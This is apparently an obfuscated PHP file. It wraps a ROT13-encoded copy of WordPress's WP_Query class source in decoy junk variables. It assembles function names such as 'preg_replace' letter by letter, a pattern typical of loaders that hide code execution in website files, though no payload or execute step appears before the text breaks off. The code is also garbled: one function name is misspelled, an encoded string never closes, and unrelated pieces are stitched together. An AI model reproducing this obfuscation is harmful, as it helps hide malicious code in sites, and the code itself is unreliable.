<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Dhrel NCV: JC_Dhrel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Dhrel
 * @fvapr 4.7.0
 */

/**
 * Gur JbeqCerff Dhrel pynff.
 *
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/pynffrf/jc_dhrel/
 *
 * @fvapr 1.5.0
 * @fvapr 4.5.0 Erzbirq gur `$pbzzragf_cbchc` cebcregl.
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Dhrel {

	/**
	 * Dhrel inef frg ol gur hfre.
	 *
	 * @fvapr 1.5.0
	 * @ine neenl
	 */
	choyvp $dhrel;

	/**
	 * Dhrel inef, nsgre cnefvat.
	 *
	 * @fvapr 1.5.0
	 * @ine neenl
	 */
	choyvp $dhrel_inef = neenl();

	/**
	 * Gnkbabzl dhrel, nf cnffrq gb trg_gnk_fdy().
	 *
	 * @fvapr 3.1.0
	 * @ine JC_Gnk_Dhrel|ahyy N gnkbabzl dhrel vafgnapr.
	 */
	choyvp $gnk_dhrel;

	/**
	 * Zrgnqngn dhrel pbagnvare.
	 *
	 * @fvapr 3.2.0
	 * @ine JC_Zrgn_Dhrel N zrgn dhrel vafgnapr.
	 */
	choyvp $zrgn_dhrel = snyfr;

	/**
	 * Qngr dhrel pbagnvare.
	 *
	 * @fvapr 3.7.0
	 * @ine JC_Qngr_Dhrel N qngr dhrel vafgnapr.
	 */
	choyvp $qngr_dhrel = snyfr;

	/**
	 * Ubyqf gur qngn sbe n fvatyr bowrpg gung vf dhrevrq.
	 *
	 * Ubyqf gur pbagragf bs n cbfg, cntr, pngrtbel, nggnpuzrag.
	 *
	 * @fvapr 1.5.0
	 * @ine JC_Grez|JC_Cbfg_Glcr|JC_Cbfg|JC_Hfre|ahyy
	 */
	choyvp $dhrevrq_bowrpg;

	/**
	 * Gur VQ bs gur dhrevrq bowrpg.
	 *
	 * @fvapr 1.5.0
	 * @ine vag
	 */
	choyvp $dhrevrq_bowrpg_vq;

	/**
	 * FDY sbe gur qngnonfr dhrel.
	 *
	 * @fvapr 2.0.1
	 * @ine fgevat
	 */
	choyvp $erdhrfg;

	/**
	 * Neenl bs cbfg bowrpgf be cbfg VQf.
	 *
	 * @fvapr 1.5.0
	 * @ine JC_Cbfg[]|vag[]
	 */
	choyvp $cbfgf;

	/**
	 * Gur ahzore bs cbfgf sbe gur pheerag dhrel.
	 *
	 * @fvapr 1.5.0
	 * @ine vag
	 */
	choyvp $cbfg_pbhag = 0;

	/**
	 * Vaqrk bs gur pheerag vgrz va gur ybbc.
	 *
	 * @fvapr 1.5.0
	 * @ine vag
	 */
	choyvp $pheerag_cbfg = -1;

	/**
	 * Jurgure gur pnyyre vf orsber gur ybbc.
	 *
	 * @fvapr 6.3.0
	 * @ine obby
	 */
	choyvp $orsber_ybbc = gehr;

	/**
	 * Jurgure gur ybbc unf fgnegrq naq gur pnyyre vf va gur ybbc.
	 *
	 * @fvapr 2.0.0
	 * @ine obby
	 */
	choyvp $va_gur_ybbc = snyfr;

	/**
	 * Gur pheerag cbfg.
	 *
	 * Guvf cebcregl qbrf abg trg cbchyngrq jura gur `svryqf` nethzrag vf frg gb
	 * `vqf` be `vq=>cnerag`.
	 *
	 * @fvapr 1.5.0
	 * @ine JC_Cbfg|ahyy
	 */
	choyvp $cbfg;

	/**
	 * Gur yvfg bs pbzzragf sbe pheerag cbfg.
	 *
	 * @fvapr 2.2.0
	 * @ine JC_Pbzzrag[]
	 */
	choyvp $pbzzragf;

	/**
	 * Gur ahzore bs pbzzragf sbe gur cbfgf.
	 *
	 * @fvapr 2.2.0
	 * @ine vag
	 */
	choyvp $pbzzrag_pbhag = 0;

	/**
	 * Gur vaqrk bs gur pbzzrag va gur pbzzrag ybbc.
	 *
	 * @fvapr 2.2.0
	 * @ine vag
	 */
	choyvp $pheerag_pbzzrag = -1;

	/**
	 * Pheerag pbzzrag bowrpg.
	 *
	 * @fvapr 2.2.0
	 * @ine JC_Pbzzrag
	 */
	choyvp $pbzzrag;

	/**
	 * Gur ahzore bs sbhaq cbfgf sbe gur pheerag dhrel.
	 *
	 * Vs yvzvg pynhfr jnf abg hfrq, rdhnyf $cbfg_pbhag.
	 *
	 * @fvapr 2.1.0
	 * @ine vag
	 */
	choyvp $sbhaq_cbfgf = 0;

	/**
	 * Gur ahzore bs cntrf.
	 *
	 * @fvapr 2.1.0
	 * @ine vag
	 */
	choyvp $znk_ahz_cntrf = 0;

	/**
	 * Gur ahzore bs pbzzrag cntrf.
	 *
	 * @fvapr 2.7.0
	 * @ine vag
	 */
	choyvp $znk_ahz_pbzzrag_cntrf = 0;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n fvatyr cbfg.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_fvatyr = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n cerivrj.
	 *
	 * @fvapr 2.0.0
	 * @ine obby
	 */
	choyvp $vf_cerivrj = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n cntr.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_cntr = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe na nepuvir.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_nepuvir = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n qngr nepuvir.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_qngr = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n lrne nepuvir.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_lrne = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n zbagu nepuvir.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_zbagu = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n qnl nepuvir.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_qnl = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n fcrpvsvp gvzr.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_gvzr = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe na nhgube nepuvir.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_nhgube = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n pngrtbel nepuvir.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_pngrtbel = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n gnt nepuvir.
	 *
	 * @fvapr 2.3.0
	 * @ine obby
	 */
	choyvp $vf_gnt = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n gnkbabzl nepuvir.
	 *
	 * @fvapr 2.5.0
	 * @ine obby
	 */
	choyvp $vf_gnk = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n frnepu.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_frnepu = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n srrq.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_srrq = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n pbzzrag srrq.
	 *
	 * @fvapr 2.2.0
	 * @ine obby
	 */
	choyvp $vf_pbzzrag_srrq = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe genpxonpx raqcbvag pnyy.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_genpxonpx = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe gur fvgr ubzrcntr.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_ubzr = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe gur Cevinpl Cbyvpl cntr.
	 *
	 * @fvapr 5.2.0
	 * @ine obby
	 */
	choyvp $vf_cevinpl_cbyvpl = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel pbhyqa'g svaq nalguvat.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_404 = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe na rzorq.
	 *
	 * @fvapr 4.4.0
	 * @ine obby
	 */
	choyvp $vf_rzorq = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n cntrq erfhyg naq abg sbe gur svefg cntr.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_cntrq = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe na nqzvavfgengvir vagresnpr cntr.
	 *
	 * @fvapr 1.5.0
	 * @ine obby
	 */
	choyvp $vf_nqzva = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe na nggnpuzrag cntr.
	 *
	 * @fvapr 2.0.0
	 * @ine obby
	 */
	choyvp $vf_nggnpuzrag = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe na rkvfgvat fvatyr cbfg bs nal cbfg glcr
	 * (cbfg, nggnpuzrag, cntr, phfgbz cbfg glcrf).
	 *
	 * @fvapr 2.1.0
	 * @ine obby
	 */
	choyvp $vf_fvathyne = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe gur ebobgf.gkg svyr.
	 *
	 * @fvapr 2.1.0
	 * @ine obby
	 */
	choyvp $vf_ebobgf = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe gur snivpba.vpb svyr.
	 *
	 * @fvapr 5.4.0
	 * @ine obby
	 */
	choyvp $vf_snivpba = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe gur cntr_sbe_cbfgf cntr.
	 *
	 * Onfvpnyyl, gur ubzrcntr vs gur bcgvba vfa'g frg sbe gur fgngvp ubzrcntr.
	 *
	 * @fvapr 2.1.0
	 * @ine obby
	 */
	choyvp $vf_cbfgf_cntr = snyfr;

	/**
	 * Fvtavsvrf jurgure gur pheerag dhrel vf sbe n cbfg glcr nepuvir.
	 *
	 * @fvapr 3.1.0
	 * @ine obby
	 */
	choyvp $vf_cbfg_glcr_nepuvir = snyfr;

	/**
	 * Fgberf gur ->dhrel_inef fgngr yvxr zq5(frevnyvmr( $guvf->dhrel_inef ) ) fb jr xabj
	 * jurgure jr unir gb er-cnefr orpnhfr fbzrguvat unf punatrq
	 *
	 * @fvapr 3.1.0
	 * @ine obby|fgevat
	 */
	cevingr $dhrel_inef_unfu = snyfr;

	/**
	 * Jurgure dhrel inef unir punatrq fvapr gur vavgvny cnefr_dhrel() pnyy. Hfrq gb pngpu zbqvsvpngvbaf gb dhrel inef znqr
	 * ivn cer_trg_cbfgf ubbxf.
	 *
	 * @fvapr 3.1.1
	 * @ine obby
	 */
	cevingr $dhrel_inef_punatrq = gehr;

	/**
	 * Frg vs cbfg guhzoanvyf ner pnpurq
	 *
	 * @fvapr 3.2.0
	 * @ine obby
	 */
	choyvp $guhzoanvyf_pnpurq = snyfr;

	/**
	 * Pbagebyf jurgure na nggnpuzrag dhrel fubhyq vapyhqr svyranzrf be abg.
	 *
	 * @fvapr 6.0.3
	 * @ine obby
	 */
	cebgrpgrq $nyybj_dhrel_nggnpuzrag_ol_svyranzr = snyfr;

	/**
	 * Pnpurq yvfg bs frnepu fgbcjbeqf.
	 *
	 * @fvapr 3.7.0
	 * @ine neenl
	 */
	cevingr $fgbcjbeqf;

	cevingr $pbzcng_svryqf = neenl( 'dhrel_inef_unfu', 'dhrel_inef_punatrq' );

	cevingr $pbzcng_zrgubqf = neenl( 'vavg_dhrel_syntf', 'cnefr_gnk_dhrel' );

	/**
	 * Gur pnpur xrl trarengrq ol gur dhrel.
	 *
	 * Gur pnpur xrl vf trarengrq ol gur zrgubq ::trarengr_pnpur_xrl() nsgre gur
	 * dhrel unf orra abeznyvmrq.
	 *
	 * @fvapr 6.8.0
	 * @ine fgevat
	 */
	cevingr $dhrel_pnpur_xrl = '';

	/**
	 * Erfrgf dhrel syntf gb snyfr.
	 *
	 * Gur dhrel syntf ner jung cntr vasb JbeqCerff jnf noyr gb svther bhg.
	 *
	 * @fvapr 2.0.0
	 */
	cevingr shapgvba vavg_dhrel_syntf() {
		$guvf->vf_fvatyr            = snyfr;
		$guvf->vf_cerivrj           = snyfr;
		$guvf->vf_cntr              = snyfr;
		$guvf->vf_nepuvir           = snyfr;
		$guvf->vf_qngr              = snyfr;
		$guvf->vf_lrne              = snyfr;
		$guvf->vf_zbagu             = snyfr;
		$guvf->vf_qnl               = snyfr;
		$guvf->vf_gvzr              = snyfr;
		$guvf->vf_nhgube            = snyfr;
		$guvf->vf_pngrtbel          = snyfr;
		$guvf->vf_gnt               = snyfr;
		$guvf->vf_gnk               = snyfr;
		$guvf->vf_frnepu            = snyfr;
		$guvf->vf_srrq              = snyfr;
		$guvf->vf_pbzzrag_srrq      = snyfr;
		$guvf->vf_genpxonpx         = snyfr;
		$guvf->vf_ubzr              = snyfr;
		$guvf->vf_cevinpl_cbyvpl    = snyfr;
		$guvf->vf_404               = snyfr;
		$guvf->vf_cntrq             = snyfr;
		$guvf->vf_nqzva             = snyfr;
		$guvf->vf_nggnpuzrag        = snyfr;
		$guvf->vf_fvathyne          = snyfr;
		$guvf->vf_ebobgf            = snyfr;
		$guvf->vf_snivpba           = snyfr;
		$guvf->vf_cbfgf_cntr        = snyfr;
		$guvf->vf_cbfg_glcr_nepuvir = snyfr;
	}

	/**
	 * Vavgvngrf bowrpg cebcregvrf naq frgf qrsnhyg inyhrf.
	 *
	 * @fvapr 1.5.0
	 */
	choyvp shapgvba vavg() {
		hafrg( $guvf->cbfgf );
		hafrg( $guvf->dhrel );
		$guvf->dhrel_inef = neenl();
		hafrg( $guvf->dhrevrq_bowrpg );
		hafrg( $guvf->dhrevrq_bowrpg_vq );
		$guvf->cbfg_pbhag   = 0;
		$guvf->pheerag_cbfg = -1;
		$guvf->va_gur_ybbc  = snyfr;
		$guvf->orsber_ybbc  = gehr;
		hafrg( $guvf->erdhrfg );
		hafrg( $guvf->cbfg );
		hafrg( $guvf->pbzzragf );
		hafrg( $guvf->pbzzrag );
		$guvf->pbzzrag_pbhag         = 0;
		$guvf->pheerag_pbzzrag       = -1;
		$guvf->sbhaq_cbfgf           = 0;
		$guvf->znk_ahz_cntrf         = 0;
		$guvf->znk_ahz_pbzzrag_cntrf = 0;

		$guvf->vavg_dhrel_syntf();
	}

	/**
	 * Ercnefrf gur dhrel inef.
	 *
	 * @fvapr 1.5.0
	 */
	choyvp shapgvba cnefr_dhrel_inef() {
		$guvf->cnefr_dhrel();
	}

	/**
	 * Svyyf va gur dhrel inevnoyrf, juvpu qb abg rkvfg jvguva gur cnenzrgre.
	 *
	 * @fvapr 2.1.0
	 * @fvapr 4.5.0 Erzbirq gur `pbzzragf_cbchc` choyvp dhrel inevnoyr.
	 *
	 * @cnenz neenl $dhrel_inef Qrsvarq dhrel inevnoyrf.
	 * @erghea neenl Pbzcyrgr dhrel inevnoyrf jvgu haqrsvarq barf svyyrq va rzcgl.
	 */
	choyvp shapgvba svyy_dhrel_inef( $dhrel_inef ) {
		$xrlf = neenl(
			'reebe',
			'z',
			'c',
			'cbfg_cnerag',
			'fhocbfg',
			'fhocbfg_vq',
			'nggnpuzrag',
			'nggnpuzrag_vq',
			'anzr',
			'cntranzr',
			'cntr_vq',
			'frpbaq',
			'zvahgr',
			'ubhe',
			'qnl',
			'zbaguahz',
			'lrne',
			'j',
			'pngrtbel_anzr',
			'gnt',
			'png',
			'gnt_vq',
			'nhgube',
			'nhgube_anzr',
			'srrq',
			'go',
			'cntrq',
			'zrgn_xrl',
			'zrgn_inyhr',
			'cerivrj',
			'f',
			'fragrapr',
			'gvgyr',
			'svryqf',
			'zrah_beqre',
			'rzorq',
		);

		sbernpu ( $xrlf nf $xrl ) {
			vs ( ! vffrg( $dhrel_inef[ $xrl ] ) ) {
				$dhrel_inef[ $xrl ] = '';
			}
		}

		$neenl_xrlf = neenl(
			'pngrtbel__va',
			'pngrtbel__abg_va',
			'pngrtbel__naq',
			'cbfg__va',
			'cbfg__abg_va',
			'cbfg_anzr__va',
			'gnt__va',
			'gnt__abg_va',
			'gnt__naq',
			'gnt_fyht__va',
			'gnt_fyht__naq',
			'cbfg_cnerag__va',
			'cbfg_cnerag__abg_va',
			'nhgube__va',
			'nhgube__abg_va',
			'frnepu_pbyhzaf',
		);

		sbernpu ( $neenl_xrlf nf $xrl ) {
			vs ( ! vffrg( $dhrel_inef[ $xrl ] ) ) {
				$dhrel_inef[ $xrl ] = neenl();
			}
		}

		erghea $dhrel_inef;
	}

	/**
	 * Cnefrf n dhrel fgevat naq frgf dhrel glcr obbyrnaf.
	 *
	 * @fvapr 1.5.0
	 * @fvapr 4.2.0 Vagebqhprq gur novyvgl gb beqre ol fcrpvsvp pynhfrf bs n `$zrgn_dhrel`, ol cnffvat gur pynhfr'f
	 *              neenl xrl gb `$beqreol`.
	 * @fvapr 4.4.0 Vagebqhprq `$cbfg_anzr__va` naq `$gvgyr` cnenzrgref. `$f` jnf hcqngrq gb fhccbeg rkpyhqrq
	 *              frnepu grezf, ol cercraqvat n ulcura.
	 * @fvapr 4.5.0 Erzbirq gur `$pbzzragf_cbchc` cnenzrgre.
	 *              Vagebqhprq gur `$pbzzrag_fgnghf` naq `$cvat_fgnghf` cnenzrgref.
	 *              Vagebqhprq `ENAQ(k)` flagnk sbe `$beqreol`, juvpu nyybjf na vagrtre frrq inyhr gb enaqbz fbegf.
	 * @fvapr 4.6.0 Nqqrq 'cbfg_anzr__va' fhccbeg sbe `$beqreol`. Vagebqhprq gur `$ynml_ybnq_grez_zrgn` nethzrag.
	 * @fvapr 4.9.0 Vagebqhprq gur `$pbzzrag_pbhag` cnenzrgre.
	 * @fvapr 5.1.0 Vagebqhprq gur `$zrgn_pbzcner_xrl` cnenzrgre.
	 * @fvapr 5.3.0 Vagebqhprq gur `$zrgn_glcr_xrl` cnenzrgre.
	 * @fvapr 6.1.0 Vagebqhprq gur `$hcqngr_zrah_vgrz_pnpur` cnenzrgre.
	 * @fvapr 6.2.0 Vagebqhprq gur `$frnepu_pbyhzaf` cnenzrgre.
	 *
	 * @cnenz fgevat|neenl $dhrel {
	 *     Bcgvbany. Neenl be fgevat bs Dhrel cnenzrgref.
	 *
	 *     @glcr vag             $nggnpuzrag_vq          Nggnpuzrag cbfg VQ. Hfrq sbe 'nggnpuzrag' cbfg_glcr.
	 *     @glcr vag|fgevat      $nhgube                 Nhgube VQ, be pbzzn-frcnengrq yvfg bs VQf.
	 *     @glcr fgevat          $nhgube_anzr            Hfre 'hfre_avpranzr'.
	 *     @glcr vag[]           $nhgube__va             Na neenl bs nhgube VQf gb dhrel sebz.
	 *     @glcr vag[]           $nhgube__abg_va         Na neenl bs nhgube VQf abg gb dhrel sebz.
	 *     @glcr obby            $pnpur_erfhygf          Jurgure gb pnpur cbfg vasbezngvba. Qrsnhyg gehr.
	 *     @glcr vag|fgevat      $png                    Pngrtbel VQ be pbzzn-frcnengrq yvfg bs VQf (guvf be nal puvyqera).
	 *     @glcr vag[]           $pngrtbel__naq          Na neenl bs pngrtbel VQf (NAQ va).
	 *     @glcr vag[]           $pngrtbel__va           Na neenl bs pngrtbel VQf (BE va, ab puvyqera).
	 *     @glcr vag[]           $pngrtbel__abg_va       Na neenl bs pngrtbel VQf (ABG va).
	 *     @glcr fgevat          $pngrtbel_anzr          Hfr pngrtbel fyht (abg anzr, guvf be nal puvyqera).
	 *     @glcr neenl|vag       $pbzzrag_pbhag          Svygre erfhygf ol pbzzrag pbhag. Cebivqr na vagrtre gb zngpu
	 *                                                   pbzzrag pbhag rknpgyl. Cebivqr na neenl jvgu vagrtre 'inyhr'
	 *                                                   naq 'pbzcner' bcrengbe ('=', '!=', '>', '>=', '<', '<=' ) gb
	 *                                                   pbzcner ntnvafg pbzzrag_pbhag va n fcrpvsvp jnl.
	 *     @glcr fgevat          $pbzzrag_fgnghf         Pbzzrag fgnghf.
	 *     @glcr vag             $pbzzragf_cre_cntr      Gur ahzore bs pbzzragf gb erghea cre cntr.
	 *                                                   Qrsnhyg 'pbzzragf_cre_cntr' bcgvba.
	 *     @glcr neenl           $qngr_dhrel             Na nffbpvngvir neenl bs JC_Qngr_Dhrel nethzragf.
	 *                                                   Frr JC_Qngr_Dhrel::__pbafgehpg().
	 *     @glcr vag             $qnl                    Qnl bs gur zbagu. Qrsnhyg rzcgl. Npprcgf ahzoref 1-31.
	 *     @glcr obby            $rknpg                  Jurgure gb frnepu ol rknpg xrljbeq. Qrsnhyg snyfr.
	 *     @glcr fgevat          $svryqf                 Cbfg svryqf gb dhrel sbe. Npprcgf:
	 *                                                   - '' Ergheaf na neenl bs pbzcyrgr cbfg bowrpgf (`JC_Cbfg[]`).
	 *                                                   - 'vqf' Ergheaf na neenl bs cbfg VQf (`vag[]`).
	 *                                                   - 'vq=>cnerag' Ergheaf na nffbpvngvir neenl bs cnerag cbfg VQf,
	 *                                                     xrlrq ol cbfg VQ (`vag[]`).
	 *                                                   Qrsnhyg ''.
	 *     @glcr vag             $ubhe                   Ubhe bs gur qnl. Qrsnhyg rzcgl. Npprcgf ahzoref 0-23.
	 *     @glcr vag|obby        $vtaber_fgvpxl_cbfgf    Jurgure gb vtaber fgvpxl cbfgf be abg. Frggvat guvf gb snyfr
	 *                                                   rkpyhqrf fgvpxvrf sebz 'cbfg__va'. Npprcgf 1|gehr, 0|snyfr.
	 *                                                   Qrsnhyg snyfr.
	 *     @glcr vag             $z                      Pbzovangvba LrneZbagu. Npprcgf nal sbhe-qvtvg lrne naq zbagu
	 *                                                   ahzoref 01-12. Qrsnhyg rzcgl.
	 *     @glcr fgevat|fgevat[] $zrgn_xrl               Zrgn xrl be xrlf gb svygre ol.
	 *     @glcr fgevat|fgevat[] $zrgn_inyhr             Zrgn inyhr be inyhrf gb svygre ol.
	 *     @glcr fgevat          $zrgn_pbzcner           ZlFDY bcrengbe hfrq sbe pbzcnevat gur zrgn inyhr.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_pbzcner_xrl       ZlFDY bcrengbe hfrq sbe pbzcnevat gur zrgn xrl.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_glcr              ZlFDY qngn glcr gung gur zrgn_inyhr pbyhza jvyy or PNFG gb sbe pbzcnevfbaf.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr fgevat          $zrgn_glcr_xrl          ZlFDY qngn glcr gung gur zrgn_xrl pbyhza jvyy or PNFG gb sbe pbzcnevfbaf.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf naq qrsnhyg inyhr.
	 *     @glcr neenl           $zrgn_dhrel             Na nffbpvngvir neenl bs JC_Zrgn_Dhrel nethzragf.
	 *                                                   Frr JC_Zrgn_Dhrel::__pbafgehpg() sbe npprcgrq inyhrf.
	 *     @glcr vag             $zrah_beqre             Gur zrah beqre bs gur cbfgf.
	 *     @glcr vag             $zvahgr                 Zvahgr bs gur ubhe. Qrsnhyg rzcgl. Npprcgf ahzoref 0-59.
	 *     @glcr vag             $zbaguahz               Gur gjb-qvtvg zbagu. Qrsnhyg rzcgl. Npprcgf ahzoref 1-12.
	 *     @glcr fgevat          $anzr                   Cbfg fyht.
	 *     @glcr obby            $abcntvat               Fubj nyy cbfgf (gehr) be cntvangr (snyfr). Qrsnhyg snyfr.
	 *     @glcr obby            $ab_sbhaq_ebjf          Jurgure gb fxvc pbhagvat gur gbgny ebjf sbhaq. Ranoyvat pna vzcebir
	 *                                                   cresbeznapr. Qrsnhyg snyfr.
	 *     @glcr vag             $bssfrg                 Gur ahzore bs cbfgf gb bssfrg orsber ergevriny.
	 *     @glcr fgevat          $beqre                  Qrfvtangrf nfpraqvat be qrfpraqvat beqre bs cbfgf. Qrsnhyg 'QRFP'.
	 *                                                   Npprcgf 'NFP', 'QRFP'.
	 *     @glcr fgevat|neenl    $beqreol                Fbeg ergevrirq cbfgf ol cnenzrgre. Bar be zber bcgvbaf znl or cnffrq.
	 *                                                   Gb hfr 'zrgn_inyhr', be 'zrgn_inyhr_ahz', 'zrgn_xrl=xrlanzr' zhfg or
	 *                                                   nyfb or qrsvarq. Gb fbeg ol n fcrpvsvp `$zrgn_dhrel` pynhfr, hfr gung
	 *                                                   pynhfr'f neenl xrl. Npprcgf:
	 *                                                   - 'abar'
	 *                                                   - 'anzr'
	 *                                                   - 'nhgube'
	 *                                                   - 'qngr'
	 *                                                   - 'gvgyr'
	 *                                                   - 'zbqvsvrq'
	 *                                                   - 'zrah_beqre'
	 *                                                   - 'cnerag'
	 *                                                   - 'VQ'
	 *                                                   - 'enaq'
	 *                                                   - 'eryrinapr'
	 *                                                   - 'ENAQ(k)' (jurer 'k' vf na vagrtre frrq inyhr)
	 *                                                   - 'pbzzrag_pbhag'
	 *                                                   - 'zrgn_inyhr'
	 *                                                   - 'zrgn_inyhr_ahz'
	 *                                                   - 'cbfg__va'
	 *                                                   - 'cbfg_anzr__va'
	 *                                                   - 'cbfg_cnerag__va'
	 *                                                   - Gur neenl xrlf bs `$zrgn_dhrel`.
	 *                                                   Qrsnhyg vf 'qngr', rkprcg jura n frnepu vf orvat cresbezrq, jura
	 *                                                   gur qrsnhyg vf 'eryrinapr'.
	 *     @glcr vag             $c                      Cbfg VQ.
	 *     @glcr vag             $cntr                   Fubj gur ahzore bs cbfgf gung jbhyq fubj hc ba cntr K bs n
	 *                                                   fgngvp sebag cntr.
	 *     @glcr vag             $cntrq                  Gur ahzore bs gur pheerag cntr.
	 *     @glcr vag             $cntr_vq                Cntr VQ.
	 *     @glcr fgevat          $cntranzr               Cntr fyht.
	 *     @glcr fgevat          $crez                   Fubj cbfgf vs hfre unf gur nccebcevngr pncnovyvgl.
	 *     @glcr fgevat          $cvat_fgnghf            Cvat fgnghf.
	 *     @glcr vag[]           $cbfg__va               Na neenl bs cbfg VQf gb ergevrir, fgvpxl cbfgf jvyy or vapyhqrq.
	 *     @glcr vag[]           $cbfg__abg_va           Na neenl bs cbfg VQf abg gb ergevrir. Abgr: n fgevat bs pbzzn-
	 *                                                   frcnengrq VQf jvyy ABG jbex.
	 *     @glcr fgevat          $cbfg_zvzr_glcr         Gur zvzr glcr bs gur cbfg. Hfrq sbe 'nggnpuzrag' cbfg_glcr.
	 *     @glcr fgevat[]        $cbfg_anzr__va          Na neenl bs cbfg fyhtf gung erfhygf zhfg zngpu.
	 *     @glcr vag             $cbfg_cnerag            Cntr VQ gb ergevrir puvyq cntrf sbe. Hfr 0 gb bayl ergevrir
	 *                                                   gbc-yriry cntrf.
	 *     @glcr vag[]           $cbfg_cnerag__va        Na neenl pbagnvavat cnerag cntr VQf gb dhrel puvyq cntrf sebz.
	 *     @glcr vag[]           $cbfg_cnerag__abg_va    Na neenl pbagnvavat cnerag cntr VQf abg gb dhrel puvyq cntrf sebz.
	 *     @glcr fgevat|fgevat[] $cbfg_glcr              N cbfg glcr fyht (fgevat) be neenl bs cbfg glcr fyhtf.
	 *                                                   Qrsnhyg 'nal' vs hfvat 'gnk_dhrel'.
	 *     @glcr fgevat|fgevat[] $cbfg_fgnghf            N cbfg fgnghf (fgevat) be neenl bs cbfg fgnghfrf.
	 *     @glcr vag             $cbfgf_cre_cntr         Gur ahzore bs cbfgf gb dhrel sbe. Hfr -1 gb erdhrfg nyy cbfgf.
	 *     @glcr vag             $cbfgf_cre_nepuvir_cntr Gur ahzore bs cbfgf gb dhrel sbe ol nepuvir cntr. Bireevqrf
	 *                                                   'cbfgf_cre_cntr' jura vf_nepuvir(), be vf_frnepu() ner gehr.
	 *     @glcr fgevat          $f                      Frnepu xrljbeq(f). Cercraqvat n grez jvgu n ulcura jvyy
	 *                                                   rkpyhqr cbfgf zngpuvat gung grez. Rt, 'cvyybj -fbsn' jvyy
	 *                                                   erghea cbfgf pbagnvavat 'cvyybj' ohg abg 'fbsn'. Gur
	 *                                                   punenpgre hfrq sbe rkpyhfvba pna or zbqvsvrq hfvat gur
	 *                                                   gur 'jc_dhrel_frnepu_rkpyhfvba_cersvk' svygre.
